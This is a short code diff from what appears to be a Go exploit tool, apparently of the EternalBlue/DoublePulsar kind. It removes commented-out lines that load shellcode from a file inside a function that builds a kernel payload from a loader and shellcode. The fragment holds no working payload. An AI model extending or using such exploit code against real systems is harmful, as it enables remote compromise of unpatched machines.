@@ -171,11 +171,6 @@ func exploit(address string, grooms int, payload []byte) error {
 
 func makeKernelUserPayload(sc []byte) []byte {
 	// test DoublePulsar
-	// sc, err := ioutil.ReadFile("sc.bin")
-	// if err != nil {
-	// 	panic(err)
-	// }
-	// return sc
 	buf := bytes.Buffer{}
 	buf.Write(loader[:])
 	// write sc size
